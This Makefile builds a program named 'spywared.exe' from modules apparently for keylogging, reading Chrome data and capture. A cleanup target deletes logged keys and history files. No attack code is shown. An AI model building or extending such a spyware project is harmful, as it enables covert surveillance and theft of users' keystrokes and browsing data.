CXXFLAGS = -Wall -Wextra -pedantic -std=c++17

spywared.exe: main.o write.o klog.o chrome.o capt.o sqlite3.o
	g++ $(CXXFLAGS) main.o write.o klog.o chrome.o capt.o sqlite3.o -o spywared.exe

klog.o: klog.cpp klog.h
	g++ $(CXXFLAGS) -c klog.cpp

chrome.o: chrome.cpp chrome.h
	g++ $(CXXFLAGS) -c chrome.cpp

write.o: write.cpp write.h
	g++ $(CXXFLAGS) -c write.cpp

capt.o: capt.cpp capt.h
	g++ $(CXXFLAGS) -c capt.cpp

main.o: main.cpp
	g++ $(CXXFLAGS) -c main.cpp

sqlite3.o: sqlite/sqlite3.c sqlite/sqlite3.h
	gcc -c sqlite/sqlite3.c

clean: 
	rm -f capt.o main.o chrome.o write.o klog.o sqlite3.o spywared.exe

dellogs:
	rm -f keys.txt history.txt